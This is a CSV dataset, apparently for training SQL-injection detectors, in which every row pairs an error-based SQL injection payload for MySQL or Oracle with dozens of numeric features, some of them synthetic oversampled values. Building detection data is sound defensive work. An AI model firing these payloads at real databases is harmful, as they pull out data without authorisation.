id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000024,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000035,0.3083911959866652,214.32487821447597,38.0,3.7716080321364656,63.0,37.0,89.97342911780375,24.351449096672233,0.2942747882716695,0.17282805025479003,0.4193480732515165,0.11354908822202399,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.351449096672233,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000025,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000132,0.16978775489890394,326.0386449023954,40.931331778742525,4.051269744923662,109.5193224511977,63.0,118.58799067245516,34.931331778742525,0.3358889263639647,0.1932522923190696,0.3637157839836229,0.10714299733334279,0.0,1.0,2.0,0.0,2.0,2.0,0.0,20.93133177874253,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.9313317787425275,0.06866822125747252,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000026,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.7440116848789348,215.3883381036173,40.95533524144691,4.263418868963598,118.43300286217035,2.0,71.0,23.95533524144691,0.549851273883772,0.009286801132634831,0.3296814402085363,0.11118048477505696,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,4.955335241446909,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000027,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000087,1.1734104761290332,320.23769673397555,40.0,4.009862433858379,105.17130902019267,63.0,117.34261804038532,34.723769673397555,0.3284415753746157,0.19690321413195505,0.3662165013163455,0.10843870917708379,0.3618848366987768,0.6381151633012232,2.0,0.0,2.0,2.0,0.0,20.723769673397555,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.3618848366987768,0.6381151633012232,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000028,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000119,2.225005857704419,317.78020649212976,37.579551750513275,3.8765038446148354,101.5265172501711,58.78786199863126,123.62493074435395,33.84089649897345,0.32126469934263285,0.18505310370759953,0.38731544570075427,0.10636675124901333,0.0,0.0,0.0,0.0,2.0,1.4734827498289078,0.0,22.840896498973446,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.473482749828907,0.0,0.0,0.0,0.5265172501710922,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,0.4734827498289078,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.473482749828907
SMOTE_000029,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,1.7917417008297396,317.1821052141203,36.486625387958426,3.853149231111081,100.02674922408315,59.1069968963326,124.45473680941353,33.59362228429102,0.3171635980789201,0.18654287805767739,0.39058542989116446,0.10570809397223807,0.0,0.0,0.0,0.0,2.0,1.5133746120415748,0.0,23.08024767224945,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.513374612041575,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,0.5133746120415749,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.513374612041574
SMOTE_000030,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000141,0.6083122345795271,195.29898276342743,27.51399507526498,3.4352679084715576,44.29898276342742,40.729007387102534,86.51399507526497,23.756997537632486,0.22664029915248574,0.208700377897999,0.44302018512981606,0.12163913781969923,0.0,0.0,0.0,0.0,0.7569975376324884,2.0,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.243002462367511,2.756997537632489,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.513995075264977,0.0,0.0,0.7569975376324884,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.270992612897466
SMOTE_000031,attack,error,"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000036,0.4524484230770908,217.2932295518973,39.0,3.7701206719147895,63.0,37.0,92.43458364151783,24.858645910379458,0.28994974669919604,0.17028794647413104,0.42536651775691176,0.11439578906976117,0.14135408962054008,0.8586459103794598,1.0,0.0,1.0,1.0,0.0,16.858645910379458,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,0.1413540896205402,0.8586459103794598,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000032,attack,error,"  (  select 2768 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  2768  =  2768,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000062,1.372326492211238,255.44731293264968,34.651538822941355,3.9545349614548275,99.21231058353086,34.32576941147068,91.9319247032361,29.977308234412035,0.3879405910994756,0.1346479029639571,0.36002132484834093,0.11739018108822646,0.32576941147067906,0.0,0.0,0.0,2.0,1.0,0.0,18.325769411470677,2.7755575615628914e-17,2.0,5.0,3.0,0.32576941147067895,0.0,0.0,0.3257694114706789,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,0.32576941147067895,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.325769411470679
SMOTE_000033,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'efwq' like 'efwq",nearest_attack_euclidean,R000115,0.29938403984841216,201.7607927775526,31.980066064796052,3.6226209846115833,58.119603611223695,31.84052851836841,84.86046245357235,26.940198194388152,0.28811969641399515,0.15777596122534485,0.4205874421451184,0.1335169002155416,4.0,0.0,0.0,0.0,0.9800660647960511,0.9800660647960512,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,1.9601321295921021,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.9800660647960512,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.940198194388153,0.0,0.0,0.9800660647960513,1.0,0.9800660647960513,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.019933935203948837,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.920264259184204
SMOTE_000034,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000099,1.7881734819446435,279.9081774439222,36.169092158879366,3.937884436671,102.73908528504285,35.0,105.0,37.169092158879366,0.3669067099329914,0.1250599200368984,0.3751797601106952,0.13285360991941503,0.0,4.0,0.0,0.0,2.0,2.0,0.0,20.0,1.169092158879369,2.0,5.0,4.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.4154539205603156,0.5845460794396844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000035,attack,error,-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,nearest_attack_euclidean,R000027,0.6132266207890322,330.2381472856024,35.84762945712048,3.6615076893782086,91.39051782848195,48.0,134.8476294571205,56.0,0.27672559311764033,0.1453540019117666,0.40834073607353205,0.169579668897061,0.0,0.15237054287951468,1.0,0.0,1.1102230246251565e-16,2.0,0.0,28.0,2.7755575615628914e-17,3.0,0.0,22.999999999999996,0.0,0.15237054287951465,0.0,0.8476294571204854,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000036,attack,error,"-3362' where 6567  =  6567 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000039,0.09831268541278805,222.82570595743638,39.182570595743634,3.9503500964307534,68.54771178723091,45.0,86.09542357446182,23.182570595743638,0.30763403428160113,0.20207737804238304,0.3862470401151682,0.10404154756084767,1.0,0.0,1.0,0.0,1.0,2.0,0.0,14.182570595743638,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,7.0
SMOTE_000037,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,1.0226466799205212,283.5836619364326,36.832676127134874,3.983419655553716,107.58366193643256,35.0,105.0,36.0,0.37936998582606046,0.12342074145504481,0.3702622243651344,0.12694704835376036,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,2.7755575615628914e-17,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.583661936432561,0.41633806356743897,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000038,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000146,0.8527579040260914,343.83136320697076,33.83372735860584,3.5433745358206683,85.33018113115327,48.334909434423366,148.0,62.16627264139416,0.2481352637193796,0.14060468096633527,0.4304560692115573,0.18080398610272785,0.665090565576635,3.334909434423365,0.0,0.0,1.1102230246251565e-16,3.0,0.0,30.0,2.0,0.49881792418247617,0.8337273586058411,22.999999999999996,0.16627264139415876,0.8337273586058412,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000039,attack,error,"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R000065,0.7192265099110525,309.1284249658859,40.282106241471475,4.099629941931615,117.08561664392394,43.0,109.52140416098098,39.521404160980985,0.378679805790212,0.13913971929986013,0.35434349735019893,0.12783697755972895,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,2.7755575615628914e-17,2.0,5.0,7.521404160980984,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.7607020804904919,4.0,0.0,1.0,2.760702080490492,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.760702080490493
SMOTE_000040,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000112,0.5808947018032945,219.76853864142078,32.0,3.5100734782154426,59.0,32.0,98.973782201184,29.7947564402368,0.2691707258990945,0.14599090218255972,0.4493468458219132,0.13549152609643256,0.0,4.0,0.0,0.0,1.0,1.0,0.0,18.7947564402368,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000041,attack,error,"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000107,1.9383754726582225,222.42245755010455,33.60934433946818,3.9519600021745065,74.90655660531819,45.0,78.73458962372273,23.781311321063637,0.336452299425283,0.20266327589436087,0.353962035287069,0.10692238939328716,0.7813113210636369,0.6093443394681816,1.2186886789363633,0.0,1.1102230246251565e-16,2.0,0.0,13.390655660531818,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,4.0,0.39065566053181844,0.6093443394681817,0.6093443394681816,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.3906556605318183,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.390655660531818
SMOTE_000042,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000078,0.6734919083983248,346.7061928690485,35.706192869048515,3.720719331142709,98.26548217262129,48.73451782737871,140.0,59.706192869048515,0.2834165244110077,0.14057537007380932,0.40380180427125434,0.17220630124392872,0.0,3.5592893035727737,1.146903565475742,0.0,1.1102230246251565e-16,3.0,0.0,28.0,2.7755575615628914e-17,3.0,0.0,24.146903565475743,0.0,1.0,0.14690356547574202,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.14690356547574202,1.0,1.0,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000043,attack,error,"1'  )   where 9544  =  9544 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000044,0.62196755060462,195.3056694267038,32.43522314223459,3.6383796365621124,48.0,40.0,81.87044628446918,25.435223142234594,0.24581624544923109,0.20484687120769257,0.41914336395737145,0.13019351938570486,0.7176115711172969,0.0,2.0,0.0,1.0,2.0,0.0,14.717611571117295,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,0.7176115711172969,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000044,attack,error,"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000057,0.14497187999816927,321.37784934147027,39.22518995609802,3.9864085087547085,104.35113973658811,63.0,118.80151964878414,35.22518995609802,0.32467131238846,0.19610360824491826,0.3696023842272587,0.10962269513936304,1.0,0.0,2.0,0.0,2.0,2.0,0.0,21.225189956098017,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000045,attack,error,"1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000155,1.4260068032841595,197.56447986690773,32.79755033564881,3.7977501136498155,52.987751678244045,44.208573825229166,74.7730536921369,25.59510067129762,0.26781851209489654,0.22611313272688077,0.3765574472498513,0.1295109079283714,2.0,0.0,0.0,0.0,0.3987751678244048,2.0,0.0,13.595100671297619,2.7755575615628914e-17,-1.1102230246251565e-16,5.202449664351191,4.398775167824405,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.7975503356488094,0.0,1.0,0.3987751678244047,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.196325503473214
SMOTE_000046,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R000025,0.44703661525582367,194.2225887496296,27.445177499259245,3.51638648205406,45.55812124740736,38.10964500148151,83.0,27.554822500740755,0.23453559653749204,0.19623553182796347,0.42734668606346127,0.14188218557108317,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.7774112503703778,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.777411250370378,1.7774112503703785,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000047,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R000110,1.450998634515142,221.6637358146038,32.0,3.951313643249905,81.0,40.58884178910886,75.8318679073019,24.24302611819304,0.366651279237633,0.18268963984206055,0.3415704348973191,0.10908864602298739,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.4486052236386078,0.0,12.897210447277216,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,2.3458156709158233,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.4486052236386078,0.0,0.44860522363860783,0.0,0.551394776361392,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.448605223638608
